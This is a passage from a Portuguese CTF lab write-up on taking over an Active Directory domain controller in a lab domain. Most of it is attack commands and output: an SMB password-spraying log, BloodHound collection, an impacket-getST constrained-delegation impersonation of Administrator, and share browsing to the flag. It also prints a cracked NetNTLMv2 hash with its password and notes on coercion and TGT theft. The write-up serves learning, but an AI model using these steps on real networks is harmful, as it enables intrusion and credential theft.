SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:ITAdmin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [+] ctf.local\it.admin:ITAdmin2019! (Guest)
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:ITAdmin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:ITAdmin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:ITAdmin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:ITAdmin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:ITAdmin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:ITAdmin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:ITAdmin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:ITAdmin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:ITAdmin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:ITAdmin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:ITAdmin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:ITAdmin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:ITAdmin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:ITAdmin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:ITAdmin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:ITAdmin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:ITAdmin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:ITAdmin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:ITAdmin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:ITAdmin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:ITAdmin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:ITAdmin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:ITAdmin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:ITAdmin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:ITAdmin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:ITAdmin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:ITAdmin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:ITAdmin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:ITAdmin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:ITAdmin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:ITAdmin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:ITAdmin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:ITAdmin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:ITAdmin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:ITAdmin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Admin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Admin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Admin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Admin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Admin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Admin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Admin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Admin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Admin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Admin2020! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Admin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Admin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Admin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Admin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Admin2021! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Admin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Admin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Admin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Admin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Admin2022! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Admin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Admin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Admin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Admin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Admin2023! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Admin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Admin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Admin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Admin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Admin2024! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Admin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Admin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Admin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Admin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Admin2025! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Admin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Admin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Admin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Admin2026! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Admin2026! STATUS_LOGON_FAILURE
```
Porém não conseguimos nada colocando possiveis senhas que usuariam.

### Bloodhound-python
O bloodhound-python é um coletor de dados para ser usado pelo bloodhound para verificação em gráfico dos dados coletados.
```
bloodhound-python -u svc.scanner -p 1summerlove! -d ctf.local -ns 10.67.154.189 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ctf.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.ctf.local:88)] [Errno -3] Temporary failure in name resolution
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.ctf.local
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.ctf.local
INFO: Done in 00M 35S
INFO: Compressing output into 20260917102703_bloodhound.zip
```
Aqui coletamos os dados pelo coletor de dados e vamos fazer upload para o bloodhound.
![[Pasted image 20260917114233.png]]
![[Pasted image 20260917115107.png]]
Vemos que temos permissão de allowedToDelegate como svc.scanner para o cifs do domain controller , com essa permissao conseguimos pedir tgs impersonando como qualquer conta , assim podemos pedir um tgs como admin.

---

## ⚡ 2. Exploração & Acesso Inicial (Foothold)

> [!failure] Vulnerabilidade Detectada: 
> **Parâmetro Vulnerável:** Smb vulnerável , devido a login anonimo e execução de tarefa agendada em IT-Shared que estava vulnerável a coerção de arquivo
> **Tipo:** Coerção de arquivo
> **Mecanismo:**  Upload de arquivo em smb shared permitido para login anonimo com leitura e escrita

 >[!failure] Vulnerabilidade Detectada: 
> **Parâmetro Vulnerável:** AllowedToDelegate para cifs do Domain Controller permitindo impersonação como qualquer usuário para pedir um tgs 
> **Tipo:** Impersonation via AllowedToDelegate
> **Mecanismo:** impacket-getTS para impersonar como admin 
```
> impacket-getST -impersonate Administrator -spn cifs/DC01.ctf.local 'ctf.local/svc.scanner:1summerlove!' -dc-ip 10.67.143.243
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
> ```
> Com o comando acima a gente coloca o TGT no arquivo de cache e podemos usar ele para acessar os shares smb.
> ```
> export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
> ```
> ```
> impacket-smbclient -k -no-pass DC01.ctf.local 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
> # shares
ADMIN$
C$
IPC$
IT-Shared
NETLOGON
SYSVOL
use C$
ls
drw-rw-rw-          0  Wed Mar 17 11:13:35 2021 $Recycle.Bin
drw-rw-rw-          0  Wed Mar 17 11:33:32 2021 Boot
-rw-rw-rw-     408686  Wed Mar 17 11:33:32 2021 bootmgr
-rw-rw-rw-          1  Wed Mar 17 11:33:32 2021 BOOTNXT
drw-rw-rw-          0  Thu Mar 11 05:38:27 2021 Documents and Settings
drw-rw-rw-          0  Thu Mar 11 05:40:28 2021 EFI
drw-rw-rw-          0  Thu May 21 23:19:03 2026 IT-Shared
-rw-rw-rw-  738197504  Thu Sep 17 10:57:51 2026 pagefile.sys
drw-rw-rw-          0  Thu Mar 11 05:40:28 2021 PerfLogs
drw-rw-rw-          0  Thu Mar 11 05:40:28 2021 Program Files
drw-rw-rw-          0  Thu Mar 11 05:40:28 2021 Program Files (x86)
drw-rw-rw-          0  Thu May 21 12:55:03 2026 ProgramData
drw-rw-rw-          0  Wed Mar 17 10:57:36 2021 Recovery
drw-rw-rw-          0  Tue May 19 22:25:08 2026 Scripts
drw-rw-rw-          0  Tue May 19 22:20:38 2026 System Volume Information
drw-rw-rw-          0  Tue May 19 22:29:58 2026 Users
drw-rw-rw-          0  Thu May 21 20:02:44 2026 Windows
cd Users
ls
drw-rw-rw-          0  Tue May 19 22:29:58 2026 .
drw-rw-rw-          0  Tue May 19 22:29:58 2026 ..
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 Administrator
drw-rw-rw-          0  Thu Mar 11 05:38:32 2021 All Users
...
cd Administrator
ls
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 .
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 ..
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 3D Objects
drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 AppData
drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 Application Data
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 Contacts
drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 Cookies
drw-rw-rw-          0  Tue May 19 22:24:53 2026 Desktop
...
cd Desktop
ls
drw-rw-rw-          0  Tue May 19 22:24:53 2026 .
drw-rw-rw-          0  Tue May 19 22:24:53 2026 ..
-rw-rw-rw-        282  Wed Mar 17 11:13:27 2021 desktop.ini
-rw-rw-rw-        527  Wed Mar 17 11:00:03 2021 EC2 Feedback.website
-rw-rw-rw-        554  Wed Mar 17 11:00:03 2021 EC2 Microsoft Windows Guide.website
-rw-rw-rw-         41  Tue May 19 22:45:19 2026 flag.txt
cat flag.txt
THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
```


> [!success] Credenciais Obtidas
> - **Usuário:** svc.scanner
> - **Senha / Hash:** SVC.SCANNER::CTF:4c1dbb27d01bd1e9:66ac00760e6cf0157f4e63fad5d2f8b6:010100000000000080cd50ba1846dd01eaeeaccad176fbc700000000020008004a0036004e00420001001e00570049004e002d004b004900490057005700300038004c004a004600350004003400570049004e002d004b004900490057005700300038004c004a00460035002e004a0036004e0042002e004c004f00430041004c00030014004a0036004e0042002e004c004f00430041004c00050014004a0036004e0042002e004c004f00430041004c000700080080cd50ba1846dd0106000400020000000800300030000000000000000100000000200000a0b04510b5f75363b45997f42302652817388e764bc9b55e3fd5c2b2013c66610a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320039002e003100380036000000000000000000:1summerlove!

---

## 🛡️ 3 Movimentação Lateral & Escalação de Privilégios

> [!warning] Meios utilizados e seus resultados
> 

> [!success] Acesso Root / Admin Conquistado
> - **Usuário Admin:** Administrator
> - **Senha / Hash:** TGT dentro de Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
> - **Flag de Root/Admin:** THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}

---

## 🔑 Tabela de Credenciais Capturadas

| Serviço / Local         | Usuário       | Senha / Hash                                              | Origem do Achado                                                  |
| :---------------------- | :------------ | :-------------------------------------------------------- | :---------------------------------------------------------------- |
| Conta de serviço do AD  | svc.scanner   | 1summerlove!                                              | Cracking de senha após coerção de autenticação via arquivo        |
| Conta admin local do AD | Administrator | TGT em Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache | Impersonation em cifs/DC01.ctf.local através da conta svc.scanner |

---

## 📚 Considerações Técnicas & Cheat Sheet

> [!info] Lições Aprendidas
> 1. Quando uma conta de serviço ou qualquer script que seja passe vistoriando arquivos para serem executados ou algo do tipo e eu possa fazer coerção por arquivo eu tenho de testar o script ntlm-theft para criar payloads (do tipo docs , url e outros) e/ou usar um payload do tipo ps1 colando o \\ip\icons\icon.ico .
> 2. Usar o bloodhound após termos uma conta de domínio é uma boa forma de vermos que tipos de privilégios temos ,utilizei de última opção e na verdade se eu tivesse usado mais cedo poderia ter usado esse vetor de ataque antes mas é relativo , eu poderia ter achado coisas importantes em NETLOGON e SYSVOL . 
> 3. Delegations -> Se uma conta tiver allowed delegation para cifs/DC podemos solicitar TGS e roubar o TGT impersonando como qualquer conta 
### Resumo Tático (IA)

- **Dominou Máquina com Unconstrained Delegation?** Eleve para `SYSTEM`, force uma conexão de uma conta com altos privilégios (via _PrinterBug_ ou _PetitPotam_) e extraia o TGT do `lsass.exe`.
    
- **Dominou Usuário com Unconstrained Delegation?** Monte um serviço com a conta em qualquer IP da rede, force o _Coercion_ e capture o TGT.
    
- **Dominou Usuário/Máquina com Constrained Delegation?** Use `impacket-getST` (Linux) ou `Rubeus s4u` (Windows) para pedir um ticket personificando o `Administrator` para o serviço permitido.